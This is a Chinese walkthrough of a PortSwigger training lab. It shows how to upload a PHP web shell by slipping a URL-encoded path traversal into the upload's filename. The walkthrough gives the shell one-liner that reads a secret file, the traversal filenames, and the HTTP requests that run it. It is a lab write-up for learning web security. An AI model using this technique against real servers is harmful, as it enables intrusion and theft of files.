# 实验：通过路径遍历上传 Web Shell

本实验包含一个易受攻击的图片上传功能。服务器被配置为阻止执行用户提供的文件，但可以通过利用[次要漏洞](https://portswigger.net/web-security/file-upload)来绕过此限制。

为了解决本实验，请上传一个基本的 PHP Web Shell，并利用它窃取 `/home/carlos/secret` 文件的内容。使用实验室横幅中提供的按钮提交此秘密信息。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤


- 在账户页面发现头像上传功能
- 将 php 代码放入 php 文件 `x.php` 中

    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
- 提交载荷文件
- 访问账户页面，自动请求头像
    ```http
    GET /files/avatars/x.php HTTP/2
    ```
    - 服务器响应普通的文件文本，而不是作为代码执行
        `<?php echo file_get_contents('/home/carlos/secret'); ?>`

- 尝试在文件名中路径遍历
    `filename="../x.php"`
    - 服务器响应
        `avatars/x.php`
        - 失败

- 尝试在文件名中进行 URL 编码的混淆路径遍历
    `filename="%2e%2e%2fx.php"`
    - 服务器响应
        `avatars/../x.php`
        - 成功

- 访问上一级目录的端点，尝试执行代码
    ```http
    GET /files/x.php HTTP/2
    ```
    - 成功
